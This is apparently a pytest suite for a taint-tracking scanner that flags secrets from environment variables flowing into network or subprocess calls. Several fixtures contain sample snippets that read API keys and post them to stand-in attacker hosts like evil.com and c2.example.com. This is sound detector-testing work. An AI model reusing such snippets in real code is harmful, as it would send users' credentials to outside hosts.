"""Tests for scan_dataflow.py - Source-to-Sink Taint Tracker."""

import scan_dataflow as scanner


def _analyze(tmp_path, filename, content):
    """Write content to a file and run analyze_file on it."""
    f = tmp_path / filename
    f.write_text(content)
    return scanner.analyze_file(str(f), filename)


class TestOsGetenvSource:
    """os.getenv() should be tracked as a taint source."""

    def test_getenv_to_requests_post(self, tmp_path):
        findings = _analyze(tmp_path, "app.py",
            "import os, requests\n"
            "key = os.getenv('API_KEY')\n"
            "requests.post('http://evil.com', data={'k': key})\n"
        )
        assert any("key" in f.description and "os.getenv" in f.description for f in findings)

    def test_getenv_taint_propagates(self, tmp_path):
        findings = _analyze(tmp_path, "app.py",
            "import os, requests\n"
            "raw = os.getenv('SECRET')\n"
            "payload = raw\n"
            "requests.post('http://c2.example.com', data=payload)\n"
        )
        assert len(findings) >= 1

    def test_getenv_without_sink_no_finding(self, tmp_path):
        findings = _analyze(tmp_path, "app.py",
            "import os\n"
            "key = os.getenv('API_KEY')\n"
            "print(key)\n"
        )
        assert findings == []


class TestCaseInsensitiveSources:
    """Source patterns should fire regardless of identifier casing."""

    def test_os_environ_mixed_case_detected(self, tmp_path):
        findings = _analyze(tmp_path, "app.py",
            "import os, requests\n"
            "key = Os.Environ.get('API_KEY')\n"
            "requests.post('http://evil.com', data={'k': key})\n"
        )
        assert any(f.category == "dataflow" for f in findings)

    def test_os_environ_upper_case_detected(self, tmp_path):
        findings = _analyze(tmp_path, "app.py",
            "import os, requests\n"
            "key = OS.ENVIRON['SECRET']\n"
            "requests.post('http://evil.com', data={'k': key})\n"
        )
        assert any(f.category == "dataflow" for f in findings)

    def test_os_getenv_mixed_case_detected(self, tmp_path):
        findings = _analyze(tmp_path, "app.py",
            "import os, requests\n"
            "key = Os.Getenv('API_KEY')\n"
            "requests.post('http://evil.com', data={'k': key})\n"
        )
        assert any(f.category == "dataflow" for f in findings)

    def test_js_process_env_uppercase_detected(self, tmp_path):
        findings = _analyze(tmp_path, "app.js",
            "const key = PROCESS.ENV.API_KEY;\n"
            "fetch('http://evil.com', { body: key });\n"
        )
        assert len(findings) >= 1

    def test_js_aliased_sink_detected(self, tmp_path):
        findings = _analyze(tmp_path, "app.js",
            "const key = process.env.SECRET;\n"
            "FETCH('http://evil.com', { body: key });\n"
        )
        assert len(findings) >= 1


class TestExistingSourcesStillWork:
    """Regression: existing source patterns continue to fire after refactor."""

    def test_os_environ_get_detected(self, tmp_path):
        findings = _analyze(tmp_path, "app.py",
            "import os, requests\n"
            "key = os.environ.get('API_KEY')\n"
            "requests.post('http://evil.com', data={'k': key})\n"
        )
        assert len(findings) >= 1

    def test_os_environ_bracket_detected(self, tmp_path):
        findings = _analyze(tmp_path, "app.py",
            "import os, requests\n"
            "key = os.environ['SECRET']\n"
            "requests.post('http://evil.com', data={'k': key})\n"
        )
        assert len(findings) >= 1

    def test_js_process_env_detected(self, tmp_path):
        findings = _analyze(tmp_path, "app.js",
            "const key = process.env.API_KEY;\n"
            "fetch('http://evil.com', { body: key });\n"
        )
        assert len(findings) >= 1


class TestTaintLifetime:
    def test_local_taint_does_not_escape_function(self, tmp_path):
        findings = _analyze(tmp_path, "app.py",
            "import os, subprocess\n"
            "def read_secret():\n"
            "    result = os.getenv('SECRET')\n"
            "    return result\n"
            "def run_safe():\n"
            "    result = subprocess.run(['echo', 'safe'])\n"
        )
        assert findings == []

    def test_reassignment_kills_taint_before_sink(self, tmp_path):
        findings = _analyze(tmp_path, "app.py",
            "import os, subprocess\n"
            "def run_safe():\n"
            "    token = os.getenv('SECRET')\n"
            "    token = 'safe'\n"
            "    subprocess.run(['echo', token])\n"
        )
        assert findings == []

    def test_same_scope_and_global_taint_still_reach_sink(self, tmp_path):
        findings = _analyze(tmp_path, "app.py",
            "import os, requests\n"
            "global_token = os.getenv('GLOBAL_SECRET')\n"
            "def send_global():\n"
            "    requests.post('https://example.com', data=global_token)\n"
            "def send_local():\n"
            "    local_token = os.getenv('LOCAL_SECRET')\n"
            "    requests.post('https://example.com', data=local_token)\n"
        )
        assert len(findings) == 2

    def test_explicit_global_assignment_reaches_later_function(self, tmp_path):
        findings = _analyze(tmp_path, "app.py",
            "import os, requests\n"
            "token = None\n"
            "def load():\n"
            "    global token\n"
            "    token = os.getenv('SECRET')\n"
            "def send():\n"
            "    requests.post('https://example.com', data=token)\n"
        )
        assert len(findings) == 1

    def test_reassignment_preserves_tainted_alias(self, tmp_path):
        findings = _analyze(tmp_path, "app.py",
            "import os, requests\n"
            "def send():\n"
            "    token = os.getenv('SECRET')\n"
            "    payload = token\n"
            "    token = 'safe'\n"
            "    requests.post('https://example.com', data=payload)\n"
        )
        assert len(findings) == 1

    def test_nested_parameter_shadows_outer_taint(self, tmp_path):
        findings = _analyze(tmp_path, "app.py",
            "import os, subprocess\n"
            "def outer():\n"
            "    token = os.getenv('SECRET')\n"
            "    def inner(token):\n"
            "        subprocess.run(['echo', token])\n"
        )
        assert findings == []

    def test_nonlocal_source_reaches_outer_sink(self, tmp_path):
        findings = _analyze(tmp_path, "app.py",
            "import os, requests\n"
            "def outer():\n"
            "    token = None\n"
            "    def load():\n"
            "        nonlocal token\n"
            "        token = os.getenv('SECRET')\n"
            "    load()\n"
            "    requests.post('https://example.com', data=token)\n"
        )
        assert len(findings) == 1
